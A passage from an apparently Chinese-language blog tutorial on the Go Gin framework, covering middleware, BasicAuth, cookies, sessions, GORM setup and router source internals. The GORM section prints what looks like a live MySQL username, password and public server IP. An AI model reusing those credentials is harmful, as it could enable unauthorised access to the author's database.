class="hljs-string">&quot;TwoMiddle&quot;</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>gin.HandlerFunc</code> -&gt; <code>context *gin.Engine</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// HandlerFunc defines the handler used by gin middleware as return value.</span><br><span class="hljs-keyword">type</span> HandlerFunc <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(*Context)</span></span><br></code></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404905.png" alt="image-20230405192050123"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>r.LoadHTMLGlob(<span class="hljs-string">&quot;templates/**/*&quot;</span>)<br>r.Static(<span class="hljs-string">&quot;/s&quot;</span>, <span class="hljs-string">&quot;/static&quot;</span>)<br><span class="hljs-comment">// 使用中间件</span><br>r.Use(middleware.OneMiddle)<br>r.Use(middleware.TwoMiddle())<br>router.Router(r)<br>r.Run()<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><ul><li>全局中间件：在<code>main</code>函数中对整个<code>gin</code>引擎的中间件<code>*gin.Engine</code>设置 -&gt; Use()</li><li>路由组中间件：对某个路由分组<code>*RouterGroup</code>的中间件设置 -&gt; Use()</li><li>局部中间件：对某个路由的中间件设置 -&gt; 将中间件放到路由和函数之间（ 参数 ）</li></ul><h4 id="全局中间件"><a href="#全局中间件" class="headerlink" title="全局中间件"></a>全局中间件</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>r.LoadHTMLGlob(<span class="hljs-string">&quot;templates/**/*&quot;</span>)<br>r.Static(<span class="hljs-string">&quot;/s&quot;</span>, <span class="hljs-string">&quot;/static&quot;</span>)<br><span class="hljs-comment">// 使用中间件</span><br>r.Use(middleware.OneMiddle)<br>r.Use(middleware.TwoMiddle())<br>router.Router(r)<br>r.Run()<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="路由组中间件"><a href="#路由组中间件" class="headerlink" title="路由组中间件"></a>路由组中间件</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Router</span><span class="hljs-params">(r *gin.Engine)</span></span> &#123;<br><span class="hljs-comment">// 定义分组</span><br>g := r.Group(<span class="hljs-string">&quot;/general&quot;</span>)<br>m := r.Group(<span class="hljs-string">&quot;/member&quot;</span>)<br><span class="hljs-comment">// 为路由组设置中间件</span><br>g.Use(middleware.OneMiddle)   <span class="hljs-comment">// general 组使用 OneMiddle 中间件</span><br>m.Use(middleware.TwoMiddle()) <span class="hljs-comment">// member 组使用 TwoMiddle中间件</span><br><span class="hljs-comment">// 将组传递给对应模块路由</span><br>general.Router(g)<br>member.Router(m)<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="局部中间件"><a href="#局部中间件" class="headerlink" title="局部中间件"></a>局部中间件</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">r.GET(<span class="hljs-string">&quot;/&quot;</span>, middleware.OneMiddle, index)<br></code></pre></td></tr></table></figure><h3 id="中间件链"><a href="#中间件链" class="headerlink" title="中间件链"></a>中间件链</h3><h4 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h4><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404360.png" alt="image-20230405194001773"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404450.png" alt="image-20230405194019667"></p><p>如果定义众多中间件，会形成一条中间件链，中间件之间的执行顺序就是main中写的顺序：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404540.png" alt="image-20230405194324172"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404721.png" alt="image-20230405194143214"></p><p>执行 -&gt; 一个钩子函数走完，再走下一个</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404028.png" alt="image-20230405194645949"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404442.png" alt="image-20230405194701949"></p><h4 id="Next"><a href="#Next" class="headerlink" title="Next"></a>Next</h4><p><code>Next()</code> ：继续走中间件链中的下一个中间件</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404254.png" alt="image-20230405195035734"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404394.png" alt="image-20230405194753356"></p><h4 id="终止链条"><a href="#终止链条" class="headerlink" title="终止链条"></a>终止链条</h4><p><code>Abort()</code>：终止掉链条，但是还是会执行完本中间件。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404062.png" alt="image-20230405195423253"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404523.png" alt="image-20230405195321783"></p><h3 id="BasicAuth中间件"><a href="#BasicAuth中间件" class="headerlink" title="BasicAuth中间件"></a>BasicAuth中间件</h3><p>Basic Authentication是一种HTTP访问控制方式，用于限制对网站资源的访问。</p><p>这种方式不需要Cookie和Session，只需要客户端发起请求的时候，在头部Header中提交用户名和密码就可以。</p><p>如果没有附加，会弹出一个对话框，要求输入用户名和密码。这种方式实施起来非常简单，适合路由器之类小型系统。</p><p>但是它不提供信息加密措施，通常都是以明文或者base64编码传输。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>authorized := r.Group(<span class="hljs-string">&quot;/admin&quot;</span>, gin.BasicAuth(gin.Accounts&#123;<br><span class="hljs-string">&quot;admin&quot;</span>: <span class="hljs-string">&quot;123456&quot;</span>,<br><span class="hljs-string">&quot;root&quot;</span>:  <span class="hljs-string">&quot;root123&quot;</span>,<br>&#125;))<br>authorized.GET(<span class="hljs-string">&quot;/login&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>user := context.MustGet(gin.AuthUserKey).(<span class="hljs-type">string</span>)<br>context.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;欢迎 %s 管理员来到后台 !&quot;</span>, user)<br>&#125;)<br>r.Run()<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051405500.png" alt="image-20230405230500993"></p><p>账号密码正确之后，即可访问</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051405225.png" alt="image-20230405230530446"></p><p>请求头中多了一个 <code>Authorization</code>：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051405073.png" alt="image-20230405230617817"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">BasicAuth</span><span class="hljs-params">(accounts Accounts)</span></span> HandlerFunc<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051405105.png" alt="image-20230405225937272"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Accounts <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051405400.png" alt="image-20230405230124130"></p><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051405412.png" alt="image-20230407095148420"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051405172.png" alt="image-20230407095201011"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">testCookie</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>cookie, err := context.Cookie(<span class="hljs-string">&quot;userName&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>cookie = <span class="hljs-string">&quot;fuyoumingyan&quot;</span><br>context.SetCookie(<span class="hljs-string">&quot;userName&quot;</span>, cookie, <span class="hljs-number">60</span>*<span class="hljs-number">60</span>, <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;43.139.185.135&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>)<br>&#125;<br>context.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;testCookie&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>r.GET(<span class="hljs-string">&quot;/cookie&quot;</span>, testCookie)<br>r.Run()<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051405502.png" alt="image-20230407095220333"></p><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>Gin 中没有集成Session功能，通过第三方的中间件来实现。</p><p><a href="https://pkg.go.dev/">https://pkg.go.dev</a> -&gt; gin session</p><p><a href="https://pkg.go.dev/github.com/gin-contrib/sessions#section-readme">https://pkg.go.dev/github.com/gin-contrib/sessions#section-readme</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051405568.png" alt="image-20230407095843919"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/gin-contrib/sessions&quot;</span><br><span class="hljs-string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>store := cookie.NewStore([]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;secret&quot;</span>))<br>r.Use(sessions.Sessions(<span class="hljs-string">&quot;mysession&quot;</span>, store))<br>r.GET(<span class="hljs-string">&quot;/hello&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>session := sessions.Default(c)<br><span class="hljs-keyword">if</span> session.Get(<span class="hljs-string">&quot;hello&quot;</span>) != <span class="hljs-string">&quot;world&quot;</span> &#123;<br>session.Set(<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;world&quot;</span>)<br>session.Save()<br>&#125;<br>c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<span class="hljs-string">&quot;hello&quot;</span>: session.Get(<span class="hljs-string">&quot;hello&quot;</span>)&#125;)<br>&#125;)<br>r.Run()<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="GORM"><a href="#GORM" class="headerlink" title="GORM"></a>GORM</h2><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051405669.png" alt="image-20230407104857197"></p><p><code>ginStudy/dbope/mysql_connect.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> dbope<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/jinzhu/gorm&quot;</span><br>_ <span class="hljs-string">&quot;github.com/jinzhu/gorm/dialects/mysql&quot;</span> <span class="hljs-comment">// 导入mysql的dialect,没有使用所以加 _</span><br>)<br><br><span class="hljs-comment">// 别的地方需要使用DB</span><br><span class="hljs-keyword">var</span> DB *gorm.DB<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 数据库连接</span><br>DB, err = gorm.Open(<span class="hljs-string">&quot;mysql&quot;</span>, <span class="hljs-string">&quot;gorm:3xrEmSCC3j68Yr57@tcp(43.139.185.135:3306)/gorm?charset=utf8&amp;parseTime=True&amp;loc=Local&quot;</span>)<br><span class="hljs-comment">// 错误处理</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ginStudy/main.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;awesomeProject/ginStudy/dbope&quot;</span><span class="hljs-comment">// 引入数据库连接部分</span><br><span class="hljs-string">&quot;awesomeProject/ginStudy/router&quot;</span><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 释放资源</span><br><span class="hljs-keyword">defer</span> dbope.DB.Close()<br>r := gin.Default()<br><span class="hljs-comment">// 加载总路由</span><br>router.Router(r)<br>r.Run()<br>&#125;<br></code></pre></td></tr></table></figure><p>总路由：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051405050.png" alt="image-20230407105133052"></p><p>学生组路由：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051405085.png" alt="image-20230407105206168"></p><p>学生表操作函数：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051405843.png" alt="image-20230407105236541"></p><p>请求：<a href="http://43.139.185.135:8080/student/registered">http://43.139.185.135:8080/student/registered</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051405934.png" alt="image-20230407105304477"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051405295.png" alt="image-20230407105350462"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><ul><li>路由设计 httprouter 实现 路由模块。 routerGroup 的 Handlers 存储了所有中间件</li><li>高性能的 Trees 基于 Radix Tree 基数树 key 就是 URL 的字符串 ，value 对应的 []HandlerFunc</li></ul><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051405685.png" alt="image-20230407122409431"></p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Default</span><span class="hljs-params">()</span></span> *Engine &#123;<br>debugPrintWARNINGDefault()<br>    <span class="hljs-comment">// New()一个Engine</span><br>engine := New()<br>    <span class="hljs-comment">// 使用Logger(), Recovery()中间件</span><br>engine.Use(Logger(), Recovery())<br><span class="hljs-keyword">return</span> engine<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">New</span><span class="hljs-params">()</span></span> *Engine &#123;<br>debugPrintWARNINGNew()<br>engine := &amp;Engine&#123;<br>        <span class="hljs-comment">// 路由组，其中Handlers为中间件 数据</span><br>RouterGroup: RouterGroup&#123;<br>Handlers: <span class="hljs-literal">nil</span>,<br>basePath: <span class="hljs-string">&quot;/&quot;</span>,<br>root:     <span class="hljs-literal">true</span>,<br>&#125;,<br>FuncMap:                template.FuncMap&#123;&#125;,<br>RedirectTrailingSlash:  <span class="hljs-literal">true</span>,<br>RedirectFixedPath:      <span class="hljs-literal">false</span>,<br>HandleMethodNotAllowed: <span class="hljs-literal">false</span>,<br>ForwardedByClientIP:    <span class="hljs-literal">true</span>,<br>RemoteIPHeaders:        []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>, <span class="hljs-string">&quot;X-Real-IP&quot;</span>&#125;,<br>TrustedPlatform:        defaultPlatform,<br>UseRawPath:             <span class="hljs-literal">false</span>,<br>RemoveExtraSlash:       <span class="hljs-literal">false</span>,<br>UnescapePathValues:     <span class="hljs-literal">true</span>,<br>MaxMultipartMemory:     defaultMultipartMemory,<br>        <span class="hljs-comment">// 方法树</span><br>        <span class="hljs-comment">// trees 负责存储路由和handle方法的映射，采用类似字典树的结构</span><br>        <span class="hljs-comment">// gin的高性能主要依靠trees</span><br>trees:                  <span class="hljs-built_in">make</span>(methodTrees, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>),<br>delims:                 render.Delims&#123;Left: <span class="hljs-string">&quot;&#123;&#123;&quot;</span>, Right: <span class="hljs-string">&quot;&#125;&#125;&quot;</span>&#125;,<br>secureJSONPrefix:       <span class="hljs-string">&quot;while(1);&quot;</span>,<br>trustedProxies:         []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;0.0.0.0/0&quot;</span>, <span class="hljs-string">&quot;::/0&quot;</span>&#125;,<br>trustedCIDRs:           defaultTrustedCIDRs,<br>&#125;<br>engine.RouterGroup.engine = engine<br>    <span class="hljs-comment">// 这里采用 sync/pool 实现context池,减少频繁context实例化带来的资源消耗</span><br>engine.pool.New = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> any &#123;<br><span class="hljs-keyword">return</span> engine.allocateContext(engine.maxParams)<br>&#125;<br><span class="hljs-keyword">return</span> engine<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// RouterGroup is used internally to configure router, a RouterGroup is associated with</span><br><span class="hljs-comment">// a prefix and an array of handlers (middleware).</span><br><span class="hljs-keyword">type</span> RouterGroup <span class="hljs-keyword">struct</span> &#123;<br>Handlers HandlersChain<span class="hljs-comment">// HandlersChain -&gt; []HandlerFunc -&gt; func(*Context)</span><br>basePath <span class="hljs-type">string</span><br>engine   *Engine<span class="hljs-comment">// 引擎</span><br>root     <span class="hljs-type">bool</span><br>&#125;<br></code></pre></td></tr></table></figure><p>Context 上下文：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051405423.png" alt="image-20230407124816118"></p><p>Engine 引擎：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051405550.png" alt="image-20230407124719872"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Engine <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-comment">// 路由组</span><br>RouterGroup<br><span class="hljs-comment">// .....</span><br>    <span class="hljs-comment">// 重定向固定路径</span><br>RedirectFixedPath <span class="hljs-type">bool</span><br>    <span class="hljs-comment">// 方法数</span><br>trees            methodTrees<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>methodTrees</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> methodTrees []methodTree<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> methodTree <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-comment">// 方法</span><br>method <span class="hljs-type">string</span><br>    <span class="hljs-comment">// 里面存储的就是按顺序执行的中间件和handle控制器方法（[]HandlerFunc）</span><br>root   *node<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> node <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-comment">// 保存这个节点上的URL路径</span><br>    <span class="hljs-comment">// 例如所画流程图中的shen和sheng, 共同的parent节点的path=&quot;s&quot; &quot;h&quot; &quot;e&quot;</span><br>    <span class="hljs-comment">// 后面两个节点的path分别是&quot;n&quot;和&quot;ng&quot;</span><br>path      <span class="hljs-type">string</span><br>    <span class="hljs-comment">// 和children[]对应, 保存的是分裂的分支的第一个字符</span><br>    <span class="hljs-comment">// 例如search和support, 那么s节点的indices对应的&quot;eu&quot;</span><br>    <span class="hljs-comment">// 代表有两个分支, 分支的首字母分别是e和u</span><br>indices   <span class="hljs-type">string</span><br>    <span class="hljs-comment">// 判断当前节点路径是不是参数节点, 例如上图的:post部分就是wildChild节点</span><br>wildChild <span class="hljs-type">bool</span><br>    <span class="hljs-comment">// 节点类型包括static, root, param, catchAll</span><br>    <span class="hljs-comment">// static: 静态节点, 例如上面分裂出来作为parent的s</span><br>    <span class="hljs-comment">// root: 如果插入的节点是第一个, 那么是root节点</span><br>    <span class="hljs-comment">// catchAll: 有*匹配的节点</span><br>    <span class="hljs-comment">// param: 除上面外的节点</span><br>nType     nodeType<br>priority  <span class="hljs-type">uint32</span><br>    <span class="hljs-comment">// 保存孩子节点</span><br>children  []*node <span class="hljs-comment">// child nodes, at most 1 :param style node at the end of the array</span><br>    <span class="hljs-comment">// 当前节点的处理函数</span><br>    <span class="hljs-comment">// []HandlerFunc</span><br>handlers  HandlersChain<br>fullPath  <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><hr><blockquote><p>*Engine.Group</p></blockquote><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051405249.png" alt="image-20230407125926152"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(group *RouterGroup)</span></span> Group(relativePath <span class="hljs-type">string</span>, handlers ...HandlerFunc) *RouterGroup &#123;<br><span class="hljs-keyword">return</span> &amp;RouterGroup&#123;<br>        <span class="hljs-comment">// cope一份全局中间件到新生成的RouterGroup.Handlers中,</span><br><span class="hljs-comment">// 接下来路由注册的时候就可以一起写入树节点中</span><br>Handlers: group.combineHandlers(handlers),<br>basePath: group.calculateAbsolutePath(relativePath),<br>engine:   group.engine,<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(group *RouterGroup)</span></span> combineHandlers(handlers HandlersChain) HandlersChain &#123;<br>finalSize := <span class="hljs-built_in">len</span>(group.Handlers) + <span class="hljs-built_in">len</span>(handlers)<br>assert1(finalSize &lt; <span class="hljs-type">int</span>(abortIndex), <span class="hljs-string">&quot;too many handlers&quot;</span>)<br>mergedHandlers := <span class="hljs-built_in">make</span>(HandlersChain, finalSize)<br>    <span class="hljs-comment">// group.Handlers copy 高于自定义 handlers</span><br><span class="hljs-built_in">copy</span>(mergedHandlers, group.Handlers)<br><span class="hljs-built_in">copy</span>(mergedHandlers[<span class="hljs-built_in">len</span>(group.Handlers):], handlers)<br><span class="hljs-keyword">return</span> mergedHandlers<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(group *RouterGroup)</span></span> GET(relativePath <span class="hljs-type">string</span>, handlers ...HandlerFunc) IRoutes &#123;<br><span class="hljs-keyword">return</span> group.handle(http.MethodGet, relativePath, handlers)<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Golang</category>
      
      <category>WEB开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Golang</tag>
      
